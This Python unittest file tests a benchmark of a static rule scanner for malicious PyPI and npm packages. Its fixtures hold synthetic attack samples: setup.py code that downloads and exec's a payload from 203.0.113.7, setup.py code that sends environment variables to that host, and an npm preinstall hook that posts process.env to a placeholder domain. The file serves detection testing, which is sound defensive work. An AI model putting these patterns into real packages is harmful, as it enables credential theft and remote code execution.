"""평가 규칙 v2 정적 규칙 층 점검(합성 압축 · 네트워크 없이) — python3 -B -m unittest discover -s bench/v2 -p 'test_*.py'

합성 표본의 「악성 모양」은 무해한 흉내다(TEST-NET 주소 · 예약 도메인만, 어떤 파일도 실행하지 않는다).
엔진(이전 프로젝트)을 불러야 하는 시험은 의존성(bench/v2/requirements-rules.txt)이 없으면 건너뛴다.
표본을 읽는 방식 · 결과 파일 · 봉인 · 보고 계산은 표준 라이브러리만으로 돈다.
"""
import __future__

import ast
import contextlib
import io
import json
import os
import random
import re
import shutil
import signal
import sys
import tarfile
import tempfile
import time
import unittest
import zipfile
from unittest import mock

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import collect  # noqa: E402
import metrics  # noqa: E402
import rules_layer  # noqa: E402
import sample  # noqa: E402
import split  # noqa: E402

NEEDS_ENGINE = unittest.skipUnless(rules_layer.engine_missing() == "", rules_layer.engine_missing())


def zip_bytes(files):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for name, data in files.items():
            zf.writestr(name, data)
    return buf.getvalue()


def tar_bytes(files, mode="w:gz"):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode=mode) as tf:
        for name, data in files.items():
            info = tarfile.TarInfo(name)
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    return buf.getvalue()


# ── 합성 표본(무해한 흉내) ──

DOWNLOAD_EXEC = b"""from setuptools import setup
import urllib.request

payload = urllib.request.urlopen("http://203.0.113.7/stage2").read()
exec(payload)

setup(name="evil-pkg", version="1.0.3")
"""
EXFIL = b"""import json
import os
import socket
import urllib.request

from setuptools import setup

info = {"host": socket.gethostname(), "env": dict(os.environ)}
urllib.request.urlopen("http://203.0.113.7/collect", data=json.dumps(info).encode())

setup(name="evil-pkg", version="1.0.3")
"""
HOOK_JSON = json.dumps({"name": "evil-npm", "version": "1.0.0", "scripts": {"preinstall": "node index.js"}}, indent=2).encode()
HOOK_JS = b"""const https = require('https');
const os = require('os');
const data = JSON.stringify({ env: process.env, host: os.hostname() });
const req = https.request({ hostname: 'collector.example.invalid', path: '/c', method: 'POST' });
req.write(data);
req.end();
"""
PLAIN_SETUP = b"""from setuptools import find_packages, setup

setup(name="plain", version="1.0", packages=find_packages(), install_requires=["requests>=2.0"])
"""
PLAIN_INIT = b'''"""Small helpers."""
import json
import os


def load(path):
    with open(path, encoding="utf-8") as f:
        return json.load(f)


def home():
    return os.environ.get("HOME", "")
'''
PLAIN_JSON = json.dumps({"name": "ok", "version": "1.0.0", "main": "index.js", "scripts": {"test": "node test.js"}}, indent=2).encode()
PLAIN_JS = b"module.exports = function add(a, b) {\n  return a + b;\n};\n"

MAL_PYPI = zip_bytes({"2025-01-01-evil-pkg-1.0.3/evil-pkg-1.0.3/setup.py": DOWNLOAD_EXEC})          # DataDog 표본 모양
MAL_EXFIL = zip_bytes({"tmp/a/b/evil-pkg-1.0.3/setup.py": EXFIL})
MAL_NPM = zip_bytes({"2025-01-01-evil-npm-v1.0.0/package/package.json": HOOK_JSON, "2025-01-01-evil-npm-v1.0.0/package/index.js": HOOK_JS})
BENIGN_SDIST = tar_bytes({"plain-1.0/setup.py": PLAIN_SETUP, "plain-1.0/plain/__init__.py": PLAIN_INIT,
                          "plain-1.0/PKG-INFO": b"Metadata-Version: 2.1\nName: plain\nVersion: 1.0\n", "plain-1.0/README.md": b"# plain\n"})
BENIGN_NPM = tar_bytes({"package/package.json": PLAIN_JSON, "package/index.js": PLAIN_JS})
BENIGN_WITH_TESTS = tar_bytes({"lib-2.0/setup.py": PLAIN_SETUP, "lib-2.0/lib/__init__.py": PLAIN_INIT,
                               "lib-2.0/tests/test_fetch.py": DOWNLOAD_EXEC, "lib-2.0/docs/example.py": EXFIL})
UNREADABLE = b"PK\x03\x04 not really a zip"


class FakeEngine:
    """엔진 없이 결과 파일 · 보고를 시험하는 대역: diff 조각에 EVIL 이 있으면 그 파일에 HIGH 규칙 하나."""
    rules = ()

    def __init__(self):
        self.calls = 0

    def scan(self, diff):
        self.calls += 1
        hits = []
        for block in diff.split("diff --git a/")[1:]:
            path = block.split(" b/", 1)[0]
            if "EVIL" in block:
                hits.append({"rule": "FAKE_HIGH", "severity": "HIGH", "category": "NONE", "file": path, "count": block.count("EVIL"),
                             "test": path.startswith("tests/"), "doc": False})
        return {"score": 60 if hits else 0, "level": "MEDIUM" if hits else "LOW", "hits": hits}


class Corpus:
    """임시 데이터 폴더: index.jsonl + store/<id>.<확장자>(봉인 구간은 sealed/<구간>/) + 분할."""

    def __init__(self, case):
        tmp = tempfile.TemporaryDirectory()
        case.addCleanup(tmp.cleanup)
        self.dir, self.rows, self.parts = tmp.name, [], {}

    def add(self, data, *, part="train", ecosystem="pypi", label="malicious", name="pkg", form="zip", stored=None, **override):
        """표본 하나를 더하고 색인 줄을 돌려준다. stored 를 주면 저장하는 바이트만 바꾼다(None 아닌 빈 값 = 저장 안 함)."""
        row = {**sample.build_row(data, ecosystem=ecosystem, label=label, name=name, version="1.0", date="2025-01-01", source="t",
                                  form=form), **override}
        folder = os.path.join(self.dir, "sealed", part) if part in split.SEALED else os.path.join(self.dir, "store")
        os.makedirs(folder, exist_ok=True)
        if stored != b"":
            with open(os.path.join(folder, f"{row['id']}.{collect.EXT[form]}"), "wb") as f:
                f.write(data if stored is None else stored)
        self.rows.append(row)
        self.parts[row["id"]] = part
        with open(os.path.join(self.dir, "index.jsonl"), "w", encoding="utf-8") as f:
            for r in sorted(self.rows, key=lambda r: r["id"]):
                f.write(json.dumps(r, ensure_ascii=False) + "\n")
        return row

    @property
    def split(self):
        return {"assignments": dict(self.parts), "sealed": list(split.SEALED)}

    def select(self, part="train", ledger=(), limit=None):
        return rules_layer.select_rows(self.dir, self.split, list(ledger), part, limit)

    def out(self, name="rules-train.jsonl"):
        return os.path.join(self.dir, "results", name)


def without_ms(path):
    with open(path, encoding="utf-8") as f:
        return [{k: v for k, v in json.loads(line).items() if k != "ms"} for line in f]


class MembersWanted(unittest.TestCase):
    """sample.members 의 선택 인자 — 읽을 파일을 바꿀 수 있고, 주지 않으면 예전과 같다."""

    FILES = {
        "pkg-1.0/setup.py": b"print(1)\n",
        "pkg-1.0/package.json": b"{}",
        "pkg-1.0/setup.cfg": b"[metadata]\nname = pkg\n",
        "pkg-1.0/Makefile": b"all:\n\ttrue\n",
        "pkg-1.0/.github/workflows/ci.yml": b"on: push\n",
        "pkg-1.0/logo.png": b"\x89PNG\x00",
    }

    def test_default_reads_only_code_files_and_package_json(self):
        for data in (zip_bytes(self.FILES), tar_bytes(self.FILES)):
            files, err = sample.members(data)
            self.assertIsNone(err)
            self.assertEqual(sorted(p for p, d in files if d is not None), ["pkg-1.0/package.json", "pkg-1.0/setup.py"])
            self.assertEqual(len(files), len(self.FILES))                     # 읽지 않는 파일도 이름은 센다
            self.assertEqual(files, sample.members(data, wanted=sample.wanted)[0])

    def test_wanted_chooses_which_files_are_read(self):
        pick = lambda path: path.rsplit("/", 1)[-1] in ("Makefile", "setup.cfg", "ci.yml")  # noqa: E731
        for data in (zip_bytes(self.FILES), tar_bytes(self.FILES)):
            files, err = sample.members(data, wanted=pick)
            self.assertIsNone(err)
            self.assertEqual({p: d for p, d in files if d is not None},
                             {"pkg-1.0/.github/workflows/ci.yml": b"on: push\n", "pkg-1.0/Makefile": b"all:\n\ttrue\n",
                              "pkg-1.0/setup.cfg": b"[metadata]\nname = pkg\n"})
            self.assertEqual([p for p, _ in files], sorted(self.FILES))

    def test_wanted_sees_the_normalized_path_and_keeps_the_size_limit(self):
        seen = []
        big = b"x" * (sample.MAX_CODE_BYTES + 1)
        files, _ = sample.members(zip_bytes({"../../etc/notes.txt": b"hi\n", "pkg/big.txt": big}),
                                  wanted=lambda path: seen.append(path) or True)
        self.assertEqual(sorted(seen), ["etc/notes.txt", "pkg/big.txt"])
        self.assertEqual(dict(files), {"etc/notes.txt": b"hi\n", "pkg/big.txt": None})   # 5MB 를 넘으면 골라도 읽지 않는다

    def test_index_row_does_not_change(self):
        row = sample.build_row(tar_bytes(self.FILES), ecosystem="pypi", label="benign", name="pkg", version="1.0", date="",
                               source="t", form="sdist")
        self.assertEqual((len(row["codeFiles"]), row["codeLines"], row["files"]), (1, 1, 6))


def legacy_eval():
    """이전 평가 스크립트에서, 옮겨 온 정의의 원본만 골라 실행한다(통째로 불러오면 엔진 설정 · 환경 변수를 읽는다)."""
    names = {"FILE_CAP", "TEXT_EXT", "EXCLUDE_RE", "SENSITIVE_RE", "_clamp", "build_diff", "_decode", "_wanted", "_strip_root"}

    def assigned(node):
        return {el.id for t in node.targets for el in (t.elts if isinstance(t, ast.Tuple) else [t]) if isinstance(el, ast.Name)}

    with open(rules_layer.EVAL_SCRIPT, encoding="utf-8") as f:
        tree = ast.parse(f.read())
    keep = [n for n in tree.body if (isinstance(n, ast.FunctionDef) and n.name in names)
            or (isinstance(n, ast.Assign) and assigned(n) & names)]
    scope = {"re": re}
    exec(compile(ast.Module(keep, []), rules_layer.EVAL_SCRIPT, "exec", flags=__future__.annotations.compiler_flag, dont_inherit=True), scope)
    assert names <= set(scope), sorted(names - set(scope))
    return scope


class Port(unittest.TestCase):
    """이전 평가에서 옮긴 함수가 원본과 같은 값을 낸다 — 원본 소스(legacy/…/scripts/eval_pipeline.py)와 맞대어 본다."""

    @classmethod
    def setUpClass(cls):
        cls.old = legacy_eval()

    def test_constants_match(self):
        self.assertEqual(rules_layer.FILE_CAP, self.old["FILE_CAP"])
        self.assertEqual(rules_layer.FILE_CAP, 20 * 1024)
        self.assertEqual(rules_layer.LONG_LINE, self.old["LONG_LINE"])
        self.assertEqual(rules_layer.TEXT_EXT, self.old["TEXT_EXT"])
        for name in ("EXCLUDE_RE", "SENSITIVE_RE"):
            self.assertEqual((getattr(rules_layer, name).pattern, getattr(rules_layer, name).flags),
                             (self.old[name].pattern, self.old[name].flags))

    def test_wanted_decode_and_strip_root_match(self):
        paths = ["setup.py", "a/b/index.JS", "pkg/Makefile", "pkg/Dockerfile", "pkg/Dockerfile.prod", "LICENSE", "a/.npmrc", "a/x.pth",
                 "a/logo.png", "a/data.tar.gz", "a/README.md", "a/req.txt", "a/x.d.ts", "a/conf.YAML", "bin/tool", "a/b.c/noext"]
        for p in paths:
            self.assertEqual(rules_layer._wanted(p), self.old["_wanted"](p), p)
        for raw in (b"plain text\n", b"\x00binary", b"x" * 4096 + b"\x00late", b"caf\xc3\xa9 \xff\xfe broken", b""):
            self.assertEqual(rules_layer._decode(raw), self.old["_decode"](raw))
        files = {"2025-01-01-evil-1.0/evil-1.0/setup.py": "a", "tmp/x/y/package/lib/index.js": "b", "package/package.json": "c",
                 "pkg/mod/__init__.py": "d", "pkg/other/__init__.py": "e", "name-2.0": "f", "top.py": "g", "a/lib-3.1.4/x/lib-0.1/y.py": "h"}
        self.assertEqual(rules_layer._strip_root(files), self.old["_strip_root"](files))
        self.assertEqual(rules_layer._strip_root(files)["__init__.py"], "e")   # 최상위 폴더가 없으면 파일 이름만 남고, 겹치면 뒤의 것

    def test_build_diff_matches_the_whole_package_form(self):
        files = {
            "src/app.py": "import os\nprint(os.getcwd())\n",
            "setup.py": "from setuptools import setup\nsetup()\n",
            "package.json": '{"name": "x"}',
            "bin/run": "#!/bin/sh\necho hi\n",
            "node_modules/dep/index.js": "skip me",
            "dist/bundle.js": "skip me",
            "lib/app.min.js": "skip me",
            "package-lock.json": "{}",
            "types/a.d.ts": "skip me",
            "lib/long.js": "var a = '" + "A" * 5000 + "';\nvar b = 1;\n",
            "lib/big.py": "x = 1\n" * 6000,
            "lib/crlf.py": "a = 1\r\nb = 2\r\n",
            "lib/유니코드.py": "이름 = '값'\n",
            "lib/empty.py": "",
        }
        mine = rules_layer.build_diff(files)
        self.assertEqual(mine, self.old["build_diff"](files, None))
        self.assertEqual(mine.count("diff --git "), 9)                         # 제외 경로 5개는 빠진다
        self.assertLess(mine.index("b/setup.py"), mine.index("b/lib/big.py"))   # 민감 파일 먼저
        self.assertIn("…[OBFUSCATION_SUSPECT 5011자]", mine)

    def test_build_diff_has_no_total_cap(self):
        files = {f"lib/m{i:02d}.py": "x = 1\n" * 3000 for i in range(20)}       # 18KB × 20 = 이전 커밋 상한(120KB)의 세 배
        mine = rules_layer.build_diff(files)
        self.assertEqual(mine, self.old["build_diff"](files, None))
        self.assertEqual(mine.count("diff --git "), 20)
        self.assertLess(self.old["build_diff"](files).count("diff --git "), 20)  # 원본의 기본값(커밋용)은 120KB 에서 멈춘다

    def test_build_diff_matches_on_random_packages(self):
        rng = random.Random(20261112)
        alphabet = ["a", "Z", "0", " ", "\t", "+", "-", "@@", "=", "'", "값", "\x0c", "\r", "diff --git a/x b/x"]
        names = ["setup.py", "index.js", "package.json", "a/b.py", "node_modules/x.js", "bin/t", "docs/c.py", "x.min.js", "Makefile"]
        for _ in range(60):
            files = {}
            for name in rng.sample(names, rng.randint(1, len(names))):
                lines = ["".join(rng.choice(alphabet) for _ in range(rng.choice([0, 10, 80, 2500])))
                         for _ in range(rng.choice([0, 1, 20, 400]))]
                files[name] = rng.choice(["\n", "\r\n"]).join(lines)
            self.assertEqual(rules_layer.build_diff(files), self.old["build_diff"](files, None))


class Input(unittest.TestCase):
    """표본 바이트 → 엔진에 넣는 파일."""

    def test_same_files_as_the_earlier_evaluation_would_read(self):
        data = zip_bytes({
            "2025-01-01-evil-pkg-1.0.3/evil-pkg-1.0.3/setup.py": DOWNLOAD_EXEC,
            "2025-01-01-evil-pkg-1.0.3/evil-pkg-1.0.3/setup.cfg": b"[metadata]\n",
            "2025-01-01-evil-pkg-1.0.3/evil-pkg-1.0.3/.github/workflows/ci.yml": b"on: push\n",
            "2025-01-01-evil-pkg-1.0.3/evil-pkg-1.0.3/Makefile": b"all:\n",
            "2025-01-01-evil-pkg-1.0.3/evil-pkg-1.0.3/PKG-INFO": b"Name: evil-pkg\n",
            "2025-01-01-evil-pkg-1.0.3/evil-pkg-1.0.3/README.md": b"# readme\n",          # .md 는 읽지 않는다
            "2025-01-01-evil-pkg-1.0.3/evil-pkg-1.0.3/logo.json": b"\x00\x01binary",       # 앞에 NUL — 이진 파일
            "2025-01-01-evil-pkg-1.0.3/package_info-evil-pkg.json": b'{"added": "by the dataset"}',  # DataDog 메타 — 패키지 내용이 아니다
            "2025-01-01-evil-pkg-1.0.3/package_info.json": b'{"added": "by the dataset"}',
        })
        files, why = rules_layer.engine_files(data)
        self.assertIsNone(why)
        self.assertEqual(sorted(files), ["evil-pkg-1.0.3/.github/workflows/ci.yml", "evil-pkg-1.0.3/Makefile", "evil-pkg-1.0.3/PKG-INFO",
                                         "evil-pkg-1.0.3/setup.cfg", "evil-pkg-1.0.3/setup.py"])
        self.assertEqual(files["evil-pkg-1.0.3/setup.py"], DOWNLOAD_EXEC.decode())

    def test_package_root_is_stripped_for_every_archive_form(self):
        self.assertEqual(sorted(rules_layer.engine_files(BENIGN_SDIST)[0]), ["PKG-INFO", "plain/__init__.py", "setup.py"])
        self.assertEqual(sorted(rules_layer.engine_files(BENIGN_NPM)[0]), ["index.js", "package.json"])
        self.assertEqual(sorted(rules_layer.engine_files(MAL_NPM)[0]), ["index.js", "package.json"])
        self.assertEqual(sorted(rules_layer.engine_files(MAL_EXFIL)[0]), ["setup.py"])

    def test_inner_archives_stay_closed_and_big_files_are_left_out(self):
        inner = zip_bytes({"hidden.py": DOWNLOAD_EXEC})
        big = b"x = 1\n" * (rules_layer.MAX_FILE_BYTES // 6 + 1)                 # 5,000,000바이트를 조금 넘는다
        files, _ = rules_layer.engine_files(zip_bytes({"pkg-1.0/inner.zip": inner, "pkg-1.0/inner.tar.gz": tar_bytes({"h.py": DOWNLOAD_EXEC}),
                                                       "pkg-1.0/big.py": big, "pkg-1.0/ok.py": b"x = 1\n"}))
        self.assertEqual(sorted(files), ["ok.py"])

    def test_unreadable_sample_gives_a_reason(self):
        self.assertEqual(rules_layer.engine_files(UNREADABLE), (None, "압축을 읽지 못함"))

    def test_truncation_is_counted_per_file(self):
        exact = "y = 123456\n" * (rules_layer.FILE_CAP // 11) + "z" * (rules_layer.FILE_CAP % 11)   # 꼭 20KB
        self.assertEqual(len(exact), rules_layer.FILE_CAP)
        files = {"small.py": "x = 1\n", "exact.py": exact, "over.py": exact + "z",
                 "long.js": "var a = '" + "A" * 100000 + "';\n",                 # 긴 줄은 먼저 줄어들어 20KB 를 넘지 않는다
                 "node_modules/dep/huge.js": "z" * 50000}                         # 제외 경로는 세지 않는다
        cuts = [cut for cut, _ in rules_layer._blocks(files)]
        self.assertEqual((len(cuts), sum(cuts)), (4, 1))

    def test_strong_leaves_out_low_rules_and_test_or_doc_files(self):
        hit = lambda rule, severity, test=False, doc=False: {"rule": rule, "severity": severity, "category": "NONE", "file": "f",  # noqa: E731
                                                              "count": 1, "test": test, "doc": doc}
        hits = [hit("B_HIGH", "HIGH"), hit("A_MEDIUM", "MEDIUM"), hit("B_HIGH", "HIGH"), hit("C_LOW", "LOW"),
                hit("D_CRITICAL", "CRITICAL", test=True), hit("E_HIGH", "HIGH", doc=True)]
        self.assertEqual(rules_layer.strong_rules(hits), ["A_MEDIUM", "B_HIGH"])
        self.assertEqual(rules_layer.strong_rules(hits[3:]), [])


class Results(unittest.TestCase):
    """결과 파일 — 표본마다 한 줄, 이어받기, 처리 못 한 표본은 status error."""

    KEYS = {"id", "status", "why", "score", "level", "hits", "strong", "truncatedFiles", "files", "ms"}

    def setUp(self):
        self.c = Corpus(self)
        self.evil = self.c.add(zip_bytes({"evil-1.0/setup.py": b"EVIL = 1\n"}), name="evil")
        self.plain = self.c.add(tar_bytes({"plain-1.0/setup.py": b"x = 1\n"}), label="benign", name="plain", form="sdist")
        self.tests = self.c.add(tar_bytes({"package/tests/a.js": b"// EVIL\n", "package/index.js": b"var a\n"}), ecosystem="npm",
                                label="benign", name="tests", form="tarball")
        self.broken = self.c.add(UNREADABLE, name="broken", codeLines=3)          # 색인에는 코드가 있다고 적힌, 읽지 못하는 표본
        self.gone = self.c.add(zip_bytes({"gone-1.0/a.py": b"EVIL\n"}), name="gone", stored=b"")
        self.swapped = self.c.add(zip_bytes({"s-1.0/a.py": b"EVIL\n"}), name="swapped", stored=zip_bytes({"s-1.0/a.py": b"other\n"}))

    def lines(self, path=None):
        return rules_layer.read_results(path or self.c.out())

    def test_one_line_per_sample_with_every_key(self):
        rows, folder = self.c.select()
        self.assertEqual([r["id"] for r in rows], sorted(r["id"] for r in self.c.rows))   # split.select_ids 순서
        self.assertEqual(rules_layer.run(FakeEngine(), rows, folder, self.c.out()), 6)
        got = self.lines()
        self.assertEqual(set(got), {r["id"] for r in rows})
        self.assertTrue(all(set(line) == self.KEYS for line in got.values()))
        evil = got[self.evil["id"]]
        self.assertEqual((evil["status"], evil["why"], evil["score"], evil["strong"], evil["files"], evil["truncatedFiles"]),
                         ("ok", "", 60, ["FAKE_HIGH"], 1, 0))
        self.assertEqual(evil["hits"], [{"rule": "FAKE_HIGH", "severity": "HIGH", "category": "NONE", "file": "setup.py", "count": 1,
                                         "test": False, "doc": False}])
        self.assertEqual((got[self.plain["id"]]["score"], got[self.plain["id"]]["strong"]), (0, []))
        self.assertEqual((len(got[self.tests["id"]]["hits"]), got[self.tests["id"]]["strong"]), (1, []))   # 시험 폴더 안의 탐지

    def test_samples_that_cannot_be_checked_stay_as_errors(self):
        rows, folder = self.c.select()
        rules_layer.run(FakeEngine(), rows, folder, self.c.out())
        got = self.lines()
        why = {name: got[getattr(self, name)["id"]] for name in ("broken", "gone", "swapped")}
        self.assertEqual({k: (v["status"], v["why"]) for k, v in why.items()},
                         {"broken": ("error", "압축을 읽지 못함"), "gone": ("error", "표본 파일 없음"),
                          "swapped": ("error", "표본 파일이 색인과 다름")})
        for v in why.values():
            self.assertEqual((v["score"], v["level"], v["hits"], v["strong"]), (None, None, [], []))

    def test_engine_failure_is_an_error_without_the_message(self):
        class Boom(FakeEngine):
            def scan(self, diff):
                raise RuntimeError("secret sample text " + diff[:40])

        rows, folder = self.c.select()
        rules_layer.run(Boom(), rows, folder, self.c.out())
        got = self.lines()[self.evil["id"]]
        self.assertEqual((got["status"], got["why"], got["score"]), ("error", "엔진 오류: RuntimeError", None))

    @unittest.skipUnless(hasattr(signal, "SIGALRM"), "SIGALRM 이 없는 곳에서는 시간 제한 없이 돈다")
    def test_slow_sample_is_cut_off(self):
        class Slow(FakeEngine):
            def scan(self, diff):
                time.sleep(30)

        t0 = time.perf_counter()
        got = rules_layer.analyze(Slow(), zip_bytes({"evil-1.0/setup.py": b"EVIL = 1\n"}), timeout=0.2)
        self.assertLess(time.perf_counter() - t0, 5)
        self.assertEqual((got["status"], got["why"], got["score"]), ("error", "시간 초과(0.2초)", None))
        self.assertEqual(signal.getitimer(signal.ITIMER_REAL)[0], 0)             # 제한을 걷어 냈다

    def test_rerun_resumes_and_skips_what_is_done(self):
        rows, folder = self.c.select()
        first = FakeEngine()
        self.assertEqual(rules_layer.run(first, rows[:2], folder, self.c.out()), 2)
        with open(self.c.out(), "a", encoding="utf-8") as f:
            f.write('{"id": "half-written li')                                   # 쓰다 끊긴 줄
        self.assertEqual(len(self.lines()), 2)
        second = FakeEngine()
        self.assertEqual(rules_layer.run(second, rows, folder, self.c.out()), 4)
        self.assertEqual(rules_layer.run(second, rows, folder, self.c.out()), 0)
        with open(self.c.out(), encoding="utf-8") as f:
            self.assertEqual(len(f.read().splitlines()), 6)                      # 끊긴 줄은 지워지고, 같은 표본을 두 번 쓰지 않는다
        self.assertEqual(set(self.lines()), {r["id"] for r in rows})

    def test_retry_errors_checks_only_the_failed_ones_again(self):
        rows, folder = self.c.select()
        rules_layer.run(FakeEngine(), rows, folder, self.c.out())
        with open(os.path.join(folder, f"{self.gone['id']}.zip"), "wb") as f:      # 빠졌던 표본 파일이 돌아왔다
            f.write(zip_bytes({"gone-1.0/a.py": b"EVIL\n"}))
        again = FakeEngine()
        self.assertEqual(rules_layer.run(again, rows, folder, self.c.out(), retry_errors=True), 3)
        self.assertEqual(again.calls, 1)                                         # 나머지 둘은 여전히 읽지 못한다
        self.assertEqual(self.lines()[self.gone["id"]]["strong"], ["FAKE_HIGH"])   # 같은 id 는 뒤의 줄이 이긴다

    def test_limit_takes_the_first_ids_in_order(self):
        rows, _ = self.c.select(limit=2)
        self.assertEqual([r["id"] for r in rows], sorted(r["id"] for r in self.c.rows)[:2])

    def test_index_and_split_must_agree(self):
        self.c.parts["f" * 16] = "train"
        with self.assertRaisesRegex(ValueError, "색인에 없는 표본 1개"):
            self.c.select()

    def test_results_of_another_engine_are_not_mixed(self):
        path = self.c.out()
        os.makedirs(os.path.dirname(path))
        rules_layer.check_engine_mark(path, "a" * 64, 71)
        rules_layer.check_engine_mark(path, "a" * 64, 71)                        # 같은 엔진이면 이어서
        with self.assertRaisesRegex(ValueError, "엔진 · 규칙이 결과 파일을 만들 때와 다르다"):
            rules_layer.check_engine_mark(path, "b" * 64, 71)
        with open(os.path.splitext(path)[0] + ".meta.json", encoding="utf-8") as f:
            self.assertEqual(json.load(f)["engineSha256"], "a" * 64)
        self.assertEqual(rules_layer.read_engine_mark(path)["rules"], 71)
        self.assertIsNone(rules_layer.read_engine_mark(self.c.out("none.jsonl")))

    def test_engine_fingerprint_follows_engine_code_and_rule_files(self):
        real = rules_layer.engine_sha256()
        self.assertRegex(real, r"^[0-9a-f]{64}$")
        copy = os.path.join(self.c.dir, "engine")
        for sub in ("app/static", "rules"):
            shutil.copytree(os.path.join(rules_layer.ENGINE_DIR, sub), os.path.join(copy, sub))
        shutil.copy(os.path.join(rules_layer.ENGINE_DIR, "app/models.py"), os.path.join(copy, "app/models.py"))
        with mock.patch.object(rules_layer, "ENGINE_DIR", copy):
            self.assertEqual(rules_layer.engine_sha256(), real)                  # 같은 파일이면 어디에 있든 같다
            with open(os.path.join(copy, "rules/general.yaml"), "a", encoding="utf-8") as f:
                f.write("# changed\n")
            changed = rules_layer.engine_sha256()
            self.assertNotEqual(changed, real)
            with open(os.path.join(copy, "rules/more.yaml"), "w", encoding="utf-8") as f:
                f.write("[]\n")
            self.assertNotEqual(rules_layer.engine_sha256(), changed)             # 새 규칙 파일도 지문에 든다


class Sealed(unittest.TestCase):
    """봉인 구간은 표본을 고르는 데서 거부한다 — 고르기는 반드시 split.select_ids."""

    def test_the_real_split_refuses_test_and_reserve(self):
        with open(split.SPLIT, encoding="utf-8") as f:
            sp = json.load(f)
        with tempfile.TemporaryDirectory() as d:
            for part in split.SEALED:
                with self.assertRaises(split.SealedError):
                    rules_layer.select_rows(d, sp, [], part)
            self.assertEqual(os.listdir(d), [])

    def test_sealed_parts_are_refused_until_the_ledger_opens_them(self):
        c = Corpus(self)
        c.add(zip_bytes({"evil-1.0/setup.py": b"EVIL = 1\n"}), name="open")
        held = c.add(zip_bytes({"held-1.0/setup.py": b"EVIL = 2\n"}), name="held", part="test")
        with self.assertRaises(split.SealedError):
            c.select("test")
        with self.assertRaises(split.SealedError):
            c.select("reserve", ledger=[{"part": "test"}])
        self.assertFalse(os.path.exists(c.out("rules-test.jsonl")))
        rows, folder = c.select("test", ledger=[{"part": "test"}])               # 연 기록이 있으면 봉인 폴더에서 읽는다
        self.assertEqual(([r["id"] for r in rows], folder), ([held["id"]], os.path.join(c.dir, "sealed", "test")))
        self.assertEqual(rules_layer.run(FakeEngine(), rows, folder, c.out("rules-test.jsonl")), 1)
        self.assertEqual(rules_layer.read_results(c.out("rules-test.jsonl"))[held["id"]]["strong"], ["FAKE_HIGH"])

    def test_results_go_under_the_data_folder_by_part(self):
        self.assertEqual(rules_layer.results_path("/data", "calibration"), "/data/results/rules-calibration.jsonl")
        with mock.patch.dict(os.environ, {"SG_BENCH_DATA": "/somewhere/else"}):
            self.assertEqual(rules_layer.data_dir(), "/somewhere/else")
        with mock.patch.dict(os.environ):
            os.environ.pop("SG_BENCH_DATA", None)
            self.assertEqual(rules_layer.data_dir(), collect.DATA)


def result(row, *, strong=(), score=0, status="ok", hits=(), cut=0):
    return {"id": row["id"], "status": status, "why": "" if status == "ok" else "압축을 읽지 못함",
            "score": score if status == "ok" else None, "level": "LOW", "hits": list(hits), "strong": list(strong),
            "truncatedFiles": cut, "files": 1, "ms": 10}


def index_row(i, label, eco="pypi", lines=5):
    return {"id": f"{i:016x}", "ecosystem": eco, "label": label, "name": f"p{i}", "codeLines": lines, "codeFiles": []}


def hit(rule, severity, test=False):
    return {"rule": rule, "severity": severity, "category": "NONE", "file": "f", "count": 1, "test": test, "doc": False}


class Report(unittest.TestCase):
    """보고 — 후보 판정과 지표. 분모는 정상 전부 + 코드 있는 악성, 처리 못 한 표본은 「못 잡음」."""

    def setUp(self):
        m = [index_row(i, "malicious", "pypi" if i < 4 else "npm") for i in range(1, 7)]          # 1~3 pypi · 4~6 npm
        self.no_code = [index_row(7, "malicious", lines=0), index_row(8, "malicious", "npm", lines=0)]
        b = [index_row(i, "benign", "pypi" if i < 110 else "npm") for i in range(100, 120)]       # pypi 10 · npm 10
        self.rows = m + self.no_code + b
        high, low = hit("R_HIGH", "HIGH"), hit("R_LOW", "LOW")
        res = [result(m[0], strong=["R_HIGH"], score=90, hits=[high, low]),
               result(m[1], strong=["R_HIGH"], score=45, hits=[high], cut=2),
               result(m[2], score=5, hits=[low]),                                                 # LOW 뿐 — strong 없음
               result(m[3], status="error"),                                                      # 읽지 못함
               # m[4] 는 결과 없음(아직 검사하지 않음)
               result(m[5], strong=["R_HIGH"], score=30, hits=[high]),
               result(self.no_code[0], strong=["R_HIGH"], score=30, hits=[high]),
               result(self.no_code[1], score=0),
               result(b[0], strong=["R_HIGH"], score=30, hits=[high]),                            # 오탐 하나
               result(b[1], score=5, hits=[low, hit("R_HIGH", "HIGH", test=True)])]
        res += [result(x, score=0) for x in b[2:]]
        self.results = {r["id"]: r for r in res}
        self.rep = rules_layer.report(self.rows, self.results)

    def test_denominators_keep_what_could_not_be_checked(self):
        self.assertEqual((self.rep["rows"], self.rep["main"], self.rep["noCodeMalicious"]), (28, {"malicious": 6, "benign": 20}, 2))
        self.assertEqual(self.rep["results"], {"ok": 26, "error": 1, "missing": 1, "errors": {"압축을 읽지 못함": 1}})

    def test_strong_candidate_matches_metrics_summary(self):
        c = self.rep["candidates"][0]
        self.assertEqual((c["name"], c["budget"], c["threshold"]), ("R-strong", None, None))
        y = [1] * 6 + [0] * 20
        pred = [True, True, False, False, False, True] + [True] + [False] * 19
        self.assertEqual(c["all"], metrics.summary(y, pred))
        self.assertEqual({k: c["all"][k] for k in ("tp", "fn", "fp", "tn")}, {"tp": 3, "fn": 3, "fp": 1, "tn": 19})
        self.assertEqual({k: c["pypi"][k] for k in ("tp", "fn", "fp", "tn")}, {"tp": 2, "fn": 1, "fp": 1, "tn": 9})
        self.assertEqual({k: c["npm"][k] for k in ("tp", "fn", "fp", "tn")}, {"tp": 1, "fn": 2, "fp": 0, "tn": 10})
        self.assertEqual(c["noCode"], {"rows": 2, "detected": 1})                 # 코드 없는 악성은 따로

    def test_score_candidates_come_from_budget_points_of_this_part(self):
        main = metrics.main_rows(self.rows)
        scores = [self.results[r["id"]]["score"] if r["id"] in self.results else None for r in main]
        points = metrics.budget_points(scores, metrics.labels(main))
        self.assertEqual(points, [("fpr<=0.0", 45)])                              # 정상 최고점 30 을 넘는 가장 낮은 점수
        got = self.rep["candidates"][1:]
        self.assertEqual([(c["name"], c["budget"], c["threshold"]) for c in got], [("R-score>=45", "fpr<=0.0", 45)])
        self.assertEqual({k: got[0]["all"][k] for k in ("tp", "fn", "fp", "tn")}, {"tp": 2, "fn": 4, "fp": 0, "tn": 20})
